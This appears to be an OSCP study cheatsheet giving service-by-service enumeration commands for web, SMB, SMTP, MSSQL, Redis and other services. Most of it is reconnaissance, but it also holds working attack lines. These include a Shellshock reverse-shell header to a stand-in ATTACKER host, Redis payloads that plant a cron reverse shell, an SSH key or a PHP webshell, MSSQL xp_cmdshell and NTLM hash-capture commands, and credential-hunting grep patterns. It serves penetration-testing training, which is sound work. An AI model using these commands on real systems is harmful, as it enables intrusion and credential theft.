---
title: "Enumeration"
date: 2026-06-20
weight: 20
draft: false
tags: ["oscp", "cheatsheet"]
summary: "Per-service enumeration command reference. When you see an open port, start with the commands in that section."
---

Per-service enumeration command reference. When you see an open port, start with the commands in that section.

- Source: https://heretek.dev/oscp-cheatsheet/enumeration/ (Jean Romero) — Reconstructed
- Variables: `$TARGET` = target host, `$KALI` = attacker Kali IP

## General Principles

- Whenever you find a hostname (page source, SSL certificate, error page, HTTP header), always add it to /etc/hosts:

```bash
echo "$ip  hostname.domain.local" | sudo tee -a /etc/hosts
```

- Run searchsploit on every version you find — broad first, narrow later (`Apache 2.4` before `Apache 2.4.49`)

## HTTP/HTTPS (80, 443, 8080+)

### Automated recon (run in parallel)

```bash
# Technology identification
whatweb http://$ip
# The Wappalyzer browser extension works too

# Nikto (fast vulnerability scan)
nikto -h http://$ip -o nikto.txt

# Directory brute force — two wordlists for coverage
feroxbuster -u http://$ip -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,asp,aspx,jsp,bak -C 404 -t 50
gobuster dir -u http://$ip -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -t 50

# Virtual hosts / subdomains (when you know the domain)
ffuf -u http://$ip/ -H "Host: FUZZ.<domain>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <default_size>
gobuster vhost -u http://$ip -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

### Manual checks

- Visit every page in the browser, click anything
- View source on every page — comments, hidden fields, JS files, version numbers
- Check: `robots.txt`, `sitemap.xml`, `.git/HEAD`, `web.config`, `.env`, `phpinfo.php`
- Check the SSL certificate (HTTPS) — it reveals hostnames and email addresses
- Check cgi-bin → if found, fuzz for `.sh`, `.pl`, `.cgi` files (Shellshock!):

```bash
gobuster dir -u http://$ip/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x sh,pl,cgi
# Shellshock test:
curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'" http://$ip/cgi-bin/script.sh
```

- If it looks like an API, fuzz endpoints:

```bash
gobuster dir -u http://$ip/api -w /usr/share/wordlists/dirb/big.txt
ffuf -u http://$ip/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api-endpoints.txt
```

### Burp Suite workflow

Burp Community (Proxy → Intercept) uses:

- Intercept and modify requests (change parameters, methods, headers)
- View full request/response pairs
- Repeater: resend and modify requests quickly
- Decoder: encode and decode payloads
- Manually test parameters for SQLi, SSTI, command injection

### WordPress Admin → RCE

When you have WP admin creds:

- Appearance → Theme Editor → `404.php`
- Replace the contents with a PHP reverse shell
- Trigger: `http://$ip/wp-content/themes/<theme-name>/404.php`

## SMB (139, 445)

```bash
# Without authentication
enum4linux-ng -A $ip
smbclient -L //$ip -N
smbmap -H $ip
netexec smb $ip -u '' -p '' --shares
nmap --script smb-vuln* -p 445 $ip

# With authentication
netexec smb $ip -u 'user' -p 'pass' --shares --users
smbmap -H $ip -u 'user' -p 'pass'
smbclient //$ip/share -U 'DOMAIN/user%pass'
```

### Downloading an entire share

```bash
smbclient //$ip/share -U 'user%pass' -c 'recurse;prompt;mget *'
# Interactively:
smbclient //$ip/share -U 'user%pass'
mask ""
recurse ON
prompt OFF
mget *
```

grep the downloaded files: `grep -ri 'password\|credential\|secret' .`

### Searching large data dumps (SMB loot, web roots, git repos)

```bash
# Step 1: understand the structure first
tree dumped_data/ -L 2
# or: find dumped_data/ -type d | head -20

# Step 2: find interesting filenames
find dumped_data/ -iname '*.config' -o -iname '*.bak' -o -iname '*.env' -o -iname '*.old' -o -iname '*.sql' -o -iname '*.log' -o -iname '.git' 2>/dev/null

# Step 3: search contents with a noise filter
grep -ri 'connectionstring\|password=\|pwd=\|user id=' dumped_data/ 2>/dev/null | grep -vi 'jquery\|\.js:\|deps.json\|nupkg\|\.dll'

# Step 4: read the files you found
cat dumped_data/path/to/interesting.config
```

Common mistakes:

- grep without `-r` = does not recurse into subdirectories
- `grep -ri password` without a noise filter = jQuery floods the output
- `dir /s` over all of C: = too slow. Check the web root first

### Fast data extraction (do not waste time reading files)

Step 1 — list before downloading (a few seconds):

```bash
# Recursive directory listing — see every file without downloading
smbmap -H $ip -u 'user' -p 'pass' -R
# With nxc:
nxc smb $ip -u 'user' -p 'pass' --shares
```

Step 2 — keyword spider without downloading (fastest):

```bash
# nxc spider_plus — crawl every share and dump the file list as JSON
nxc smb $ip -u 'user' -p 'pass' -M spider_plus
# Output goes to /tmp/nxc_spider_plus/ — review the JSON for interesting filenames
cat /tmp/nxc_spider_plus/*.json | python3 -m json.tool | grep -i "password\|credential\|config\|backup\|secret\|key\|id_rsa\|\.kdbx\|\.conf\|\.ini\|\.log"
```

Step 3 — mount the share locally (best for large data):

```bash
# Mount to a local directory — then use normal Linux tools (find, grep, etc.)
mkdir /tmp/smb_share
sudo mount -t cifs //$ip/share /tmp/smb_share -o username=user,password=pass
# Search with full Linux capability:
grep -ri 'password\|credential\|secret\|hash\|ntlm' /tmp/smb_share/ 2>/dev/null
find /tmp/smb_share/ -name "*.txt" -o -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.log" -o -name "*.bak" -o -name "*.kdbx" -o -name "id_rsa" 2>/dev/null
# Unmount when done:
sudo umount /tmp/smb_share
```

Step 4 — bulk download + grep when the mount fails:

```bash
# Download everything
smbclient //$ip/share -U 'user%pass' -c 'recurse;prompt;mget *'
# Search locally:
grep -ri 'password\|credential\|secret\|hash\|ntlm\|connectionstring' . 2>/dev/null
find . -name "*.txt" -o -name "*.conf" -o -name "*.log" -o -name "*.bak" -o -name "*.kdbx" | xargs grep -li 'password\|secret\|hash' 2>/dev/null
```

The same applies to every large dump (SMB, FTP, web scrapes, git repos, etc.):

```bash
# After receiving files from any source:

# 1. Filenames — files worth opening
find . -iname "*password*" -o -iname "*credential*" -o -iname "*secret*" -o -iname "*backup*" -o -iname "*dump*" 2>/dev/null
find . -iname "*.kdbx" -o -iname "*.key" -o -iname "*.pem" -o -iname "*.ppk" -o -iname "id_rsa" -o -iname "id_ed25519" 2>/dev/null
find . -iname "*.sql" -o -iname "*.db" -o -iname "*.sqlite" -o -iname "*.mdb" 2>/dev/null
find . -iname "*.bak" -o -iname "*.old" -o -iname "*.orig" -o -iname "*.save" -o -iname "*.swp" 2>/dev/null
find . -iname "*.zip" -o -iname "*.tar.gz" -o -iname "*.7z" -o -iname "*.rar" 2>/dev/null

# 2. Web app configs — hardcoded creds, DB connection strings, API keys
find . -iname "web.config" -o -iname "wp-config.php" -o -iname "config.php" -o -iname ".env" -o -iname "appsettings.json" -o -iname "database.yml" -o -iname ".htpasswd" -o -iname "connections.xml" 2>/dev/null

# 3. Logs — often contain plaintext passwords, hashes, usernames
find . -iname "*.log" 2>/dev/null
# Read interesting logs:
# grep -i 'password\|fail\|login\|auth\|ntlm\|hash\|credential' interesting.log

# 4. File content search — the master grep
grep -ri 'password\|credential\|secret\|hash\|ntlm\|connectionstring\|pwd=\|pass=\|api_key\|apikey\|token\|mysql_connect\|db_password\|jdbc:' . 2>/dev/null | grep -v Binary | head -50

# 5. Git repos — deleted passwords survive in old commits
find . -name ".git" -type d 2>/dev/null
# When found:
# cd /path/to/repo && git log --oneline && git log -p | grep -i 'password\|secret\|key\|token'

# 6. Source code with hardcoded creds
find . -iname "*.php" -o -iname "*.py" -o -iname "*.js" -o -iname "*.aspx" -o -iname "*.jsp" -o -iname "*.conf" -o -iname "*.ini" -o -iname "*.xml" 2>/dev/null | xargs grep -li 'password\|passwd\|pwd\|secret\|conn.*string' 2>/dev/null

# 7. Recently modified files (more likely to be relevant)
find . -type f -mtime -90 -ls 2>/dev/null | head -30

# 8. Hidden files — dotfiles an admin hid
find . -name ".*" -type f 2>/dev/null

# 9. Archives — extract and search inside
# unzip backup.zip -d backup_extracted/
# tar xzf backup.tar.gz -C backup_extracted/
# Re-run the same search in the extracted folder
```

One-liner that finds everything (copy-paste this first):

```bash
find . \( -iname "*.log" -o -iname "*.bak" -o -iname "*.sql" -o -iname "*.conf" -o -iname "*.config" -o -iname "*.ini" -o -iname "*.env" -o -iname "*.kdbx" -o -iname "*.key" -o -iname "id_rsa" -o -iname "*.old" -o -iname "*password*" -o -iname "*backup*" -o -iname "*.db" -o -iname ".htpasswd" -o -iname "wp-config*" -o -iname "web.config" \) 2>/dev/null
```

Rule: run this one-liner first on every data dump. Read the interesting files, then dig deeper only when needed.

### Web app config files — where creds show up (run on every SMB dump / web root)

When you get access to an SMB share or web root, look for config files containing DB connection strings first. Every web app keeps its DB creds in a config file.

```bash
# 1. Find config files — top priority
find . -iname "web.config" -o -iname "wp-config.php" -o -iname "config.php" -o -iname ".env" -o -iname "appsettings.json" -o -iname "database.yml" -o -iname "settings.py" 2>/dev/null

# 2. Grep for connection strings (excluding framework noise)
grep -ri "connectionstring\|password=\|pwd=\|user id=\|data source=\|db_password\|mysql_connect" . 2>/dev/null | grep -v Binary | grep -vi "jquery\|\.js:\|\.css:\|deps.json\|nupkg\|\.dll\|node_modules"
```

Config file locations per platform:

- DNN/DotNetNuke: `web.config` (wwwroot) — connectionStrings with SQL user/pass
- WordPress: `wp-config.php` — DB_USER, DB_PASSWORD, DB_HOST
- ASP.NET: `web.config` or `appsettings.json` — connectionStrings section
- PHP (Laravel): `.env` — DB_PASSWORD, APP_KEY, MAIL_PASSWORD
- PHP (generic): `config.php`, `db.php` — db_pass, mysqli_connect()
- Umbraco: `web.config` (IIS) — connectionStrings + Umbraco keys
- XAMPP: `phpMyAdmin/config.inc.php` — MySQL root password

Found DB creds → connect and dump users:

```bash
# MSSQL
impacket-mssqlclient "dbuser:dbpassword"@TARGET -port PORT
# Then: SELECT Username, Password FROM Users;

# MySQL
mysql -h TARGET -u dbuser -p"dbpassword"
# Then: SELECT user, password FROM mysql.user;
```

Noise exclusion when grepping SMB dumps:

```bash
# Bad (thousands of false positives from jQuery and framework files)
grep -ri "password" . 2>/dev/null

# Good (targets config patterns only and excludes noise)
grep -ri "password=\|pwd=\|connectionstring\|user id=" . 2>/dev/null | grep -vi "jquery\|\.js:\|\.css:\|deps.json\|nupkg"
```

## SNMP (161 UDP)

```bash
# Community string brute force
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $ip

# Enumerate with the community string you found
snmpcheck -t $ip -c public
snmpwalk -c public -v2c $ip
```

### Windows SNMP OIDs (memorize)

```bash
snmpwalk -c public -v1 $ip 1.3.6.1.4.1.77.1.2.25       # usernames
snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.4.2.1.2      # running processes
snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.6.3.1.2      # installed software
snmpwalk -c public -v1 $ip 1.3.6.1.2.1.6.13.1.3        # open TCP ports
```

## DNS (53)

```bash
# Zone transfer (try both)
dig AXFR @$ip <domain>
host -l <domain> $ip

# Subdomain enumeration
dnsrecon -d <domain> -t std
dnsrecon -d <domain> -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt
dnsenum <domain>

# Reverse lookup (find hostnames in a subnet)
for i in $(seq 1 254); do host 10.10.10.$i $ip; done | grep -v "not found"
nslookup $ip $ip
```

## LDAP (389, 636)

```bash
# Anonymous bind
ldapsearch -x -H ldap://$ip -s base namingcontexts
ldapsearch -x -H ldap://$ip -b "DC=domain,DC=com"

# With authentication
ldapsearch -x -H ldap://$ip -D 'DOMAIN\user' -w 'password' -b "DC=domain,DC=com"

# windapsearch (fast against AD)
python3 windapsearch.py --dc-ip $ip -u 'user' -p 'pass' --da --privileged-users
```

## FTP (21)

```bash
ftp $ip                # try anonymous:anonymous
# Inside FTP:
ls -la
binary                 # switch to binary mode for non-text files
get <file>
put <file>             # upload test — if FTP root = web root, upload a webshell
```

If the FTP root overlaps the web root → upload a PHP/ASP webshell → trigger it in the browser.

## SMTP (25)

### Enumeration

```bash
# Banner grab — reveals software, version, hostname, sometimes the domain name
nc -nv $ip 25
nmap -p 25 --script smtp-commands,smtp-enum-users,smtp-ntlm-info $ip
```

### User enumeration (3 ways — try all, each server blocks differently)

```bash
# Method 1: VRFY (most common, often works)
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $ip

# Method 2: EXPN (mailing list expansion — can reveal users when VRFY is blocked)
smtp-user-enum -M EXPN -U /usr/share/seclists/Usernames/Names/names.txt -t $ip

# Method 3: RCPT
smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/Names/names.txt -t $ip -D domain.com
```

### Manual VRFY (when the tool fails or for a quick check)

```bash
nc -nv $ip 25
# EHLO attacker.com
# VRFY admin
# VRFY root
# VRFY john
# 252 = user exists, 550 = does not exist
```

### Using the usernames you found

```bash
# 1. Feed into password spraying
nxc smb $ip -u smtp_users.txt -p passwords.txt --continue-on-success
nxc winrm $ip -u smtp_users.txt -p passwords.txt --continue-on-success

# 2. Feed into kerbrute (in an AD environment)
kerbrute userenum --dc DC_IP -d domain.com smtp_users.txt

# 3. Feed into AS-REP roasting
impacket-GetNPUsers 'domain.com/' -usersfile smtp_users.txt -dc-ip DC_IP -no-pass

# 4. Client-side attack — send a phishing email with a payload attached
```

### Sending mail (for AD client-side attacks / phishing)

```bash
# swaks — the Swiss Army knife for SMTP
swaks -t target@domain.com --from attacker@domain.com --attach @payload.ext --server $ip --body @body.txt --header "Subject: Important" --suppress-data -ap

# Simple send with nc when swaks is unavailable
nc -nv $ip 25
# EHLO attacker.com
# MAIL FROM:<attacker@domain.com>
# RCPT TO:<target@domain.com>
# DATA
# Subject: Important
# <message body>
# .
# QUIT
```

### Enumerating email addresses with swaks

When VRFY and RCPT TO return nothing via smtp-user-enum, check directly with swaks:

```bash
# Test a single address
sudo swaks -t user@domain.com --from test@domain.com --server $ip --body "test" --header "Subject: test"

# Reading the output:
# MAIL FROM -> 250 OK     = sender accepted (always works, ignore)
# RCPT TO  -> 250 OK      = recipient exists
# RCPT TO  -> 550 Unknown  = recipient does not exist

# Username loop
for user in name1 name2 name3; do
  echo -n "$user@domain.com: "
  sudo swaks -t "$user@domain.com" --from test@domain.com --server $ip --body "test" --header "Subject: test" 2>&1 | grep -oP '(250 OK|550 Unknown)'
done
```

### SMTP authentication

If every address returns 550, the server may require authentication:

```bash
# Use auth creds (found in git repos, config files, databases)
sudo swaks -t target@domain.com --from sender@domain.com --server $ip --body @body.txt --header "Subject: Important" -ap -au username -ap password
```

## NFS (2049)

```bash
showmount -e $ip
mkdir /tmp/nfs && mount -t nfs $ip:/share /tmp/nfs
ls -la /tmp/nfs
```

## MSSQL (1433)

### Connecting — try both authentication methods

```bash
# Windows authentication (domain/local Windows account) — try first
impacket-mssqlclient 'user:pass'@$ip -windows-auth

# SQL authentication (SQL Server account) — when -windows-auth fails
impacket-mssqlclient 'user:pass'@$ip

# Use single quotes if the password contains $ to prevent bash expansion
impacket-mssqlclient 'user:P@ssw0rd$123'@$ip -windows-auth
```

### After connecting — full enumeration workflow

```sql
-- 0. Current context
SELECT SYSTEM_USER;
SELECT ORIGINAL_LOGIN();
SELECT USER_NAME();
SELECT DB_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');
```

### 1. Impacket helpers

```text
enum_db enum_logins enum_users enum_owner enum_impersonate enum_links
```

If enum_impersonate lists a login, impersonate it:

```sql
exec_as_login LOGIN_NAME
```

Manual impersonation:

```sql
EXECUTE AS LOGIN = 'LOGIN_NAME';
SELECT SYSTEM_USER;
SELECT USER_NAME();
SELECT DB_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');
```

Return to the original login:

```sql
REVERT;
```

### 2. Listing databases

```sql
SELECT name FROM master.sys.databases;
```

Check which DBs you can access:

```sql
SELECT name, HAS_DBACCESS(name) AS has_access FROM master.sys.databases;
```

Switch DB:

```sql
USE dbname;
SELECT DB_NAME();
```

### 3. Listing tables

Inside the current DB:

```sql
SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';
```

Another DB (without switching):

```sql
SELECT TABLE_SCHEMA, TABLE_NAME FROM dbname.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';
```

Format: `database.schema.table`

### 4. Listing columns

```sql
SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS ORDER BY TABLE_NAME, ORDINAL_POSITION;
```

Finding interesting columns:

```sql
SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE '%pass%'    OR COLUMN_NAME LIKE '%user%'    OR COLUMN_NAME LIKE '%hash%'    OR COLUMN_NAME LIKE '%email%'    OR COLUMN_NAME LIKE '%login%'    OR COLUMN_NAME LIKE '%key%'    OR COLUMN_NAME LIKE '%token%' ORDER BY TABLE_NAME;
```

Another DB:

```sql
SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME, DATA_TYPE FROM dbname.INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE '%pass%'    OR COLUMN_NAME LIKE '%user%'    OR COLUMN_NAME LIKE '%hash%'    OR COLUMN_NAME LIKE '%email%'    OR COLUMN_NAME LIKE '%login%'    OR COLUMN_NAME LIKE '%key%'    OR COLUMN_NAME LIKE '%token%' ORDER BY TABLE_NAME;
```

### 5. Dumping interesting tables

Basic:

```sql
SELECT * FROM dbo.TableName;
```

Top rows:

```sql
SELECT TOP 20 * FROM dbo.TableName;
```

Full path:

```sql
SELECT * FROM dbname.dbo.TableName;
```

### 6. Impersonation paths

Find possible targets:

```sql
SELECT DISTINCT b.name FROM sys.server_permissions a JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
```

Alternative query:

```sql
SELECT pe.permission_name, pe.state_desc, pr.name AS principal FROM sys.server_permissions pe JOIN sys.server_principals pr ON pe.grantor_principal_id = pr.principal_id WHERE pe.permission_name = 'IMPERSONATE';
```

Run impersonation:

```sql
EXECUTE AS LOGIN = 'LOGIN_NAME';
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

If sysadmin = 1:

```sql
enable_xp_cmdshell EXEC xp_cmdshell 'whoami';
```

If sysadmin = 0:

```sql
SELECT name, HAS_DBACCESS(name) AS has_access FROM master.sys.databases;
```

Enumerate the DBs you can read.

### 7. xp_cmdshell

Impacket shortcut:

```text
enable_xp_cmdshell xp_cmdshell whoami
```

Manual SQL:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

If `xp_cmdshell 'whoami'` throws a syntax error:

```sql
EXEC xp_cmdshell 'whoami';
```

Reverse shell:

```sql
EXEC xp_cmdshell 'powershell -exec bypass -enc BASE64_PAYLOAD';
```

### 8. Common mistakes

- Forgetting `RECONFIGURE` after `sp_configure` — the setting silently does not apply
- Running `xp_cmdshell` before checking `IS_SRVROLEMEMBER('sysadmin') = 1` — a waste of time if you are not sysadmin
- Forgetting `REVERT;` after `EXECUTE AS LOGIN` — the impersonation persists and later checks read in the wrong context
- The `--` comment kills everything to the end of the line — put comments on their own line, not appended to a SELECT

### 9. Quick decision flow

```text
Connect to MSSQL
  ↓ check sysadmin
  ↓ sysadmin = 1 → xp_cmdshell
  ↓ sysadmin = 0 → enum_impersonate
  ↓ impersonation possible → EXECUTE AS LOGIN
  ↓ check sysadmin again
  ↓ still not → list accessible DBs
  ↓ find a readable DB
  ↓ list tables
  ↓ list interesting columns
  ↓ dump creds
  ↓ spray creds against SMB/WinRM/RDP/MSSQL
```

Even without sysadmin you cannot use xp_cmdshell, but you can pull creds from user tables. Spray those creds against other machines.

### Legacy enumeration (quick check)

```sql
SELECT @@version;
SELECT name FROM master.dbo.sysdatabases;
SELECT * FROM master..syslogins;
```

### Command execution (xp_cmdshell)

```sql
-- Enable xp_cmdshell (requires the sysadmin role)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

### Stealing the NTLMv2 hash (when xp_cmdshell is denied)

```bash
# Terminal 1: start Responder
sudo responder -I tun0

# Terminal 2: from the MSSQL client, force authentication to your IP
EXEC xp_dirtree '\\YOUR_IP\share', 1, 1;
# or:
EXEC master..xp_subdirs '\\YOUR_IP\share';
```

Responder captures the NTLMv2 hash of the MSSQL service account → crack with `hashcat -m 5600`

## Redis (6379) — often unauthenticated = free shell

Unauthenticated Redis is an opportunity in itself. Check it on every engagement.

```bash
# Connection test (no auth if misconfigured)
redis-cli -h $ip
> INFO                          # server info — check OS and version
> CONFIG GET dir                # current working directory
> CONFIG GET dbfilename         # current dump filename
```

### Method 1 — Write an SSH key (Linux target, preferred)

```bash
# Generate a key pair
ssh-keygen -t rsa -f ./redis_key -N ""

# Pad the key with newlines (important — the Redis RDB format adds junk bytes before and after the data)
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > spaced_key.txt

# Write the key into Redis and dump it as authorized_keys
# FLUSHALL wipes all Redis data — fine on the exam but dangerous in production
redis-cli -h $ip flushall
cat spaced_key.txt | redis-cli -h $ip -x set crackit
redis-cli -h $ip CONFIG SET dir /root/.ssh/
redis-cli -h $ip CONFIG SET dbfilename "authorized_keys"
redis-cli -h $ip save

# Connect
ssh -i redis_key root@$ip
```

### Method 2 — Write a cron job (when the .ssh directory does not exist)

```bash
redis-cli -h $ip
> SET rev "\n\n*/1 * * * * bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'\n\n"
> CONFIG SET dir /var/spool/cron/crontabs/
> CONFIG SET dbfilename root
> SAVE
```

Wait up to a minute for cron to fire. Catch it with `nc -lvnp 4444`.

### Method 3 — Write a webshell (when a web server is running)

```bash
redis-cli -h $ip
> CONFIG SET dir /var/www/html/
> SET shell "<?php system($_GET['cmd']); ?>"
> CONFIG SET dbfilename shell.php
> SAVE
```

Visit `http://$ip/shell.php?cmd=id` to confirm execution.

If CONFIG SET is disabled: Redis 4.x+ may allow MODULE LOAD — search GitHub for the Redis Rogue Server exploit.

## RDP (3389)

```bash
xfreerdp /u:user /p:'pass' /v:$ip /cert:ignore +clipboard
xfreerdp /d:domain.com /u:user /p:'pass' /v:$ip /cert:ignore +clipboard
```

## Port scanning an internal network (no tools)

Use this when you are pivoted and have no nmap.

```bash
# Bash (Linux)
for i in $(seq 1 254); do (ping -c 1 -W 1 10.10.10.$i | grep "bytes from" &); done
for port in 21 22 80 135 139 445 3389 5985; do (echo >/dev/tcp/10.10.10.5/$port) 2>/dev/null && echo "$port open"; done
```

```powershell
# PowerShell (Windows)
1..254 | % {Test-Connection "10.10.10.$_" -Count 1 -Quiet -TimeoutSeconds 1}
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("10.10.10.5", $_)) "TCP port $_ is open"} 2>$null
Test-NetConnection -Port 445 10.10.10.5
```

## Discipline for enumerating large SMB shares

If `nxc --shares` shows READ on shares beyond the defaults (apps, monitoring, scripts, backup, data), do not mget everything. Follow the order below.

### Step 1: recursive listing without downloading

```bash
smbclient //IP/sharename -U 'DOMAIN\user%pass' -c 'recurse ON; ls'
```

### Step 2: identify high-signal files

Priority file types:

- .ps1 .psm1 — PowerShell scripts
- PowerShell_transcript.*.txt — transcripts containing plaintext passwords
- .kdbx — KeePass databases
- .config .xml — connection strings, credentials
- .log .txt — may contain command history
- .ini .properties — configuration
- .bat .cmd .sh — scripts with embedded credentials
- .ps1xml — PowerShell module definitions

Low signal: .exe .dll .jpg .png .msi (unless you need a binary to reverse)

### Step 3: targeted download

```bash
smbclient //IP/share -U 'user%pass' -c 'recurse ON; prompt OFF; mask *.ps1; mget *; mask *.txt; mget *'
```

### Step 4: search contents with smbmap (without downloading)

```bash
smbmap -H IP -u user -p pass -d domain -R sharename -A 'password|secure|credential|transcript'
```

smbmap flags:

- -A PATTERN: content search (grep inside files)
- -F PATTERN: filename pattern
- -R PATH: recurse from a path
- --search-path PATH: starting location
- --download PATH: download a specific file

A common syntax trap: `--search` is ambiguous (it collides with --search-path and --search-timeout). Use `-A` or `-F`.

### Step 5: grep the downloaded contents

```bash
grep -ri password .
grep -riE 'password|secret|credential|api[_-]?key|token|ConvertTo-SecureString|PSCredential'
```

True story: a low-privilege user had READ on a share containing PowerShell transcripts, and one of them held a domain admin plaintext password. Always grep transcripts for ConvertTo-SecureString / PSCredential.

A single correct grep took 30 seconds for what would have taken hours if every app had been dumped.

Rule: list before you download. Filter by file type. Grep ConvertTo-SecureString and PSCredential first.
